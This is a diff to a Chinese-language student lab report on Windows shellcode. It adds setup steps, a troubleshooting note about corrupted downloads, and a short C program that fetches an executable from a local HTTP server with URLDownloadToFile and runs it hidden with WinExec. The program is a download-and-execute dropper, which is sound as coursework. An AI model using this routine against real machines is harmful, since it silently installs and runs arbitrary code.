@@ -131,14 +131,38 @@ shellcode要实现的步骤：
 6. 指定函数参数
 7. 调用函数
 #### 实验步骤
-1. 
+1. 使用cmd.exe进入shellcode.exe文件夹，输入```python -m http.server 5000```开启静态服务器提供exe下载。
+* 可以执行以下代码并试用体会URLDownloadToFile()和WinExec()功能。测试结果如图：  
+![](images/test1.png)
+```
+#include <stdio.h>
+#include <Urlmon.h>
+#include <shellapi.h>
+#pragma comment (lib,"Urlmon.lib")
+int main(void)
+{
+ HRESULT hr = URLDownloadToFile(NULL, "http://127.0.0.1:5000/memory.exe", "shellcode.exe", 0, NULL);
+ if (hr == S_OK)
+ {
+  printf("OK\n");
+ }
+ WinExec("shellcode.exe", 0);
+ ExitProcess(0);
+ return 0;
+
+}
+```
+2.
 #### 实验效果
 
 ## 实验问题
 1. linux 32位的系统搞了好久，怪不得老师说要认真学习使用vim与vi,现在64位最新使用的系统已经十分人性化，而以前的系统真是十分严格的linux呢！而且host-only的dhcp也是要自己搞，还好之前ns课程有踩坑。
 2. 对于汇编语言和C语言的编译链接方式不一样，windows 32位系统shellcode的应用也搞了好久，因为使用之前的```cl /c /MT a.c```和```link /SUBSYSTEM:CONSOLE,5.01 a.obj```依然无法在xp-sp3中使用，只能采用汇编语言编译链接的方式。  
 关于编译链接的总结：在自己有限次数的实验中，发现如果有汇编语言，那么编译链接汇编语言的方式更为靠谱，此外，同一个示例代码不能因为一次应用不成功就否认，应该变换工具编译链接，然后再扔到各个环境中尝试。
-3. 
+3. 测试使用URLDownloadToFile()下载文件的时候，一开始偷懒没有自己搭服务器，而是上传到了github上再下载，会出现文件损坏。  
+![](images/wrong1.png)  
+分析：一开始以为是函数使用错误，结果不是，观察很久发现是文件损坏。原因是github服务器在国外，速度慢，下载过程中会疏漏。  
+解决：自己搭静态服务器。
 ## 实验总结
 1. 经过此次实验作业，加深了对汇编语言的理解和感受，学好汇编太重要了。首先是AT&T与Intel风格的汇编语言区别:  
 DOS/Windows 下的汇编语言代码都是 Intel 风格的，而 Linux 和 Unix 系统中更多采用的是 AT&T 格式。  
